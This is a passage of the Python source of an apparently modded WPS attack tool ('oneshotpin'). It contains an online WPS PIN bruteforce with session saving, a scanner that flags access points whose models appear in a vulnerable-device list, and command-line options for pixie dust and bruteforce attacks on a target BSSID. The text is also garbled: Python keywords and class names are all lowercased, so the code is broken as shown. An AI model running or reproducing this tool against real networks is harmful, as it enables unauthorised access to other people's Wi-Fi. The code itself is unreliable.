                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerattempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return false

    def smart_bruteforce(self, bssid, start_pin=none, delay=none):
        if (not start_pin) or (len(start_pin) < 4):
            # trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input('[?] restore previous session for {}? [n/y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise filenotfounderror
            except filenotfounderror:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = bruteforcestatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'got_psk'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise keyboardinterrupt
        except keyboardinterrupt:
            print("\naborting…")
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[i] session saved in {}'.format(filename))
            if args.loop:
                raise keyboardinterrupt

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=true)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()


class wifiscanner:
    """docstring for wifiscanner"""
    def __init__(self, interface, vuln_list=none):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvreader = csv.reader(file, delimiter=';', quoting=csv.quote_all)
                # skip header
                next(csvreader)
                self.stored = []
                for row in csvreader:
                    self.stored.append(
                        (
                            row[1],   # bssid
                            row[2]    # essid
                        )
                    )
        except filenotfounderror:
            self.stored = []

    def iw_scanner(self) -> dict[int, dict]:
        """parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'security type': 'unknown',
                        'wps': false,
                        'wps locked': false,
                        'model': '',
                        'model number': '',
                        'device name': ''
                     }
                )
            networks[-1]['bssid'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['essid'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['level'] = int(float(result.group(1)))

        def handle_securitytype(line, result, networks):
            sec = networks[-1]['security type']
            if result.group(1) == 'capability':
                if 'privacy' in result.group(2):
                    sec = 'wep'
                else:
                    sec = 'open'
            elif sec == 'wep':
                if result.group(1) == 'rsn':
                    sec = 'wpa2'
                elif result.group(1) == 'wpa':
                    sec = 'wpa'
            elif sec == 'wpa':
                if result.group(1) == 'rsn':
                    sec = 'wpa/wpa2'
            elif sec == 'wpa2':
                if result.group(1) == 'wpa':
                    sec = 'wpa/wpa2'
            networks[-1]['security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['wps'] = result.group(1)

        def handle_wpslocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['wps locked'] = true

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelnumber(line, result, networks):
            d = result.group(1)
            networks[-1]['model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_devicename(line, result, networks):
            d = result.group(1)
            networks[-1]['device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=true, stdout=subprocess.pipe,
                              stderr=subprocess.stdout, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'bss (\s+)( )?\(on \w+\)'): handle_network,
            re.compile(r'ssid: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dbm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securitytype,
            re.compile(r'(rsn):\t [*] version: (\d+)'): handle_securitytype,
            re.compile(r'(wpa):\t [*] version: (\d+)'): handle_securitytype,
            re.compile(r'wps:\t [*] version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] ap setup locked: (0x[0-9]+)'): handle_wpslocked,
            re.compile(r' [*] model: (.*)'): handle_model,
            re.compile(r' [*] model number: (.*)'): handle_modelnumber,
            re.compile(r' [*] device name: (.*)'): handle_devicename
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] error:', line)
                return false
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # filtering non-wps networks
        networks = list(filter(lambda x: bool(x['wps']), networks))
        if not networks:
            return false

        # sorting by signal level
        networks.sort(key=lambda x: x['level'], reverse=true)

        # putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # printing scanning results as table
        def truncatestr(s, length, postfix='…'):
            """
            truncate string with the specified length
            @s — input string
            @length — length of output string
            """
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=none):
            """returns colored text"""
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text

        if self.vuln_list:
            print('network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('possibly vulnerable', color='green'),
                colored('wps locked', color='red'),
                colored('already stored', color='yellow')
            ))
        print('networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'bssid', 'essid', 'sec.', 'pwr', 'wsc device name', 'wsc model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['model'], network['model number'])
            essid = truncatestr(network['essid'], 25)
            devicename = truncatestr(network['device name'], 27)
            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                number, network['bssid'], essid,
                network['security type'], network['level'],
                devicename, model
                )
            if (network['bssid'], network['essid']) in self.stored:
                print(colored(line, color='yellow'))
            elif network['wps locked']:
                print(colored(line, color='red'))
            elif self.vuln_list and (model in self.vuln_list):
                print(colored(line, color='green'))
                proc = subprocess.popen('termux-vibrate -f', shell=true)
                proc = subprocess.popen('termux-play-audio play knock.ogg', shell=true)
            else:
                print(line)

        return network_list

    def prompt_network(self) -> str:
        networks = self.iw_scanner()
        if not networks:
            print('[-] no wps networks found.')
            return
        while 1:
            try:
                networkno = input('select target (press enter to refresh): ')
                if networkno.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkno) in networks.keys():
                    return networks[int(networkno)]['bssid']
                else:
                    raise indexerror
            except exception:
                print('invalid number')


def ifaceup(iface, down=false):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=true, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return true
    else:
        return false


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return """
oneshotpin 0.0.2 (c) 2017 rofl0r, modded by drygdryg

%(prog)s <arguments>

required arguments:
    -i, --interface=<wlan0>  : name of the interface to use

optional arguments:
    -b, --bssid=<mac>        : bssid of the target ap
    -p, --pin=<wps pin>      : use the specified pin (arbitrary string or 4/8 digit pin)
    -k, --pixie-dust         : run pixie dust attack
    -b, --bruteforce         : run online bruteforce attack
    --push-button-connect    : run wps push button connection

advanced arguments:
    -d, --delay=<n>          : set the delay between pin attempts [0]
    -w, --write              : write ap credentials to the file on success
    -f, --pixie-force        : run pixiewps with --force option (bruteforce full range)
    -x, --show-pixie-cmd     : always print pixiewps command
    --vuln-list=<filename>   : use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : down network interface when the work is finished
    -l, --loop               : run in a loop
    -r, --reverse-scan       : reverse order of networks in the list of networks. useful on small displays
    -v, --verbose            : verbose output

example:
    %(prog)s -i wlan0 -b 00:90:4c:c1:ac:21 -k
"""


if __name__ == '__main__':
    import argparse

    parser = argparse.argumentparser(
        description='oneshotpin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
        epilog='example: %(prog)s -i wlan0 -b 00:90:4c:c1:ac:21 -k'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=true,
        help='name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='bssid of the target ap'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-k', '--pixie-dust',
        action='store_true',
        help='run pixie dust attack'
        )
    parser.add_argument(
        '-f', '--pixie-force',
        action='store_true',
        help='run pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-x', '--show-pixie-cmd',
        action='store_true',
        help='always print pixiewps command'
        )
    parser.add_argument(
        '-b', '--bruteforce',
        action='store_true',
        help='run online bruteforce attack'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='run wps push button connection'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='use custom file with vulnerable devices list'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='run in a loop'
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='reverse order of networks in the list of networks. useful on small displays'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='verbose output'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060f0:
        die("the program requires python 3.6 and above")
    if os.getuid() != 0:
        die("run it as root")

    if not ifaceup(args.interface):
        die('unable to up interface "{}"'.format(args.interface))

    while true:
        try:
            companion = companion(args.interface, args.write, print_debug=args.verbose)
            if args.pbc:
                companion.single_connection(pbc_mode=true)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except filenotfounderror:
                        vuln_list = []
                    scanner = wifiscanner(args.interface, vuln_list)
                    if not args.loop:
                        print('[*] bssid not specified (--bssid) — scanning for available networks')
                    args.bssid = scanner.prompt_network()

                if args.bssid:
                    companion = companion(args.interface, args.write, print_debug=args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = none
        except keyboardinterrupt:
            if args.loop:
                if input("\n[?] exit the script (otherwise continue to ap scan)? [n/y] ").lower() == 'y':
                    print("aborting…")
                    break
                else:
                    args.bssid = none
            else:
                print("\naborting…")
                break

    if args.iface_down:
        ifaceup(args.interface, down=true)
